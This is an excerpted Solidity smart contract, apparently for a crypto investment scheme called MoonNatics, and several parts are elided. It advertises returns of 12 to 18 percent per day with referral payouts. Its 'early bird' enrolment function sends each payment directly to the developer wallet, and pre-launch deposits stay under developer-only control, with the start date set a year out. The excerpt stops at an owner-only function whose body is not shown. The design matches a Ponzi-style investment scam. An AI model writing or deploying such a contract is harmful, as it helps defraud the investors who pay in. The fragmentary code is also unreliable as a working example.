...
contract MoonNAticsTest {
	...
	uint256 public totalEarlyBirdInvestments;
	uint256 public totalEarlyBirdDeposits;
	...
	struct EarlyBirdUser {
		EarlyBirdDeposit[] earlyDeposits;
		address payable referrer;
	}

	EarlyBirdDeposit[] internal earlyDepositsAll;

	mapping (address => User) internal users;

	mapping (address => EarlyBirdUser) internal earlyBirdUsers;
	...
	constructor(address payable wallet, address payable _dev) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
		developerWallet = _dev;
        startUNIX = block.timestamp.add(365 days);

        plans.push(Plan(7, 180)); // 18% per day for 7 days
        plans.push(Plan(14, 140)); // 14% per day for 14 days
        plans.push(Plan(21, 120)); // 12% per day for 21 days
		plans.push(Plan(7, 180)); // 18% per day compunded everyday for 7 days
        plans.push(Plan(14, 140)); // 14% per day compunded everyday for 14 days
        plans.push(Plan(21, 120)); // 12% per day compunded everyday for 21 days
    ...
    function earlyBirdEnroll(address payable referrer) public payable {
        require(msg.value >= INVEST_MIN_AMOUNT);

		address payable sender = msg.sender;
		
		EarlyBirdUser storage earlybirdUsers = earlyBirdUsers[sender];
		earlybirdUsers.referrer = referrer;

		User storage user = users[sender];
		user.earlyBird = true;
		developerWallet.transfer(msg.value);

		totalEarlyBirdUsers = totalEarlyBirdUsers.add(1);
           
    }
	
	function invest(address payable referrer,uint8 plan) public payable {
        if(startUNIX > block.timestamp && users[msg.sender].earlyBird == true){
			earlyBirdInvest(referrer, plan, msg.sender, msg.value);
		}else{
	...
	function earlyBirdInvest(address payable referrer, uint8 plan, address payable sender, uint256 value) internal{
		
		require(users[sender].earlyBird);

		earlyBirdUsers[sender].earlyDeposits.push(EarlyBirdDeposit(sender, plan, value, referrer));
		earlyDepositsAll.push(EarlyBirdDeposit(sender, plan, value, referrer));
		totalEarlyBirdInvestments = totalEarlyBirdInvestments.add(1);
		totalEarlyBirdDeposits = totalEarlyBirdDeposits.add(value);
	}

	function earlyBirdsFly() public {
		require(msg.sender == developerWallet);

		for(uint i = 0; i < totalEarlyBirdInvestments; i++){
			address payable user = earlyDepositsAll[i].sender;
			uint8 plan = earlyDepositsAll[i].plan;
			uint256 amount = earlyDepositsAll[i].amount;
			address payable referrer = earlyDepositsAll[i].referrer;

			_invest(referrer, plan, user, amount);
	...
	function getUserAmountOfEarlyBirdDeposits(address userAddress) public view returns(uint256) {
		return earlyBirdUsers[userAddress].earlyDeposits.length;
	}

	function getUserTotalEarlyBirdDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < earlyBirdUsers[userAddress].earlyDeposits.length; i++) {
			amount = amount.add(earlyBirdUsers[userAddress].earlyDeposits[i].amount);
		}
	}
	...
	function getUserEarlyDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 amount, address payable refAddress) {
	    EarlyBirdUser storage user = earlyBirdUsers[userAddress];

		plan = user.earlyDeposits[index].plan;
		amount = user.earlyDeposits[index].amount;
		refAddress = user.earlyDeposits[index].referrer;
	}
    ...
    function MoonNatics() public onlyOwner {
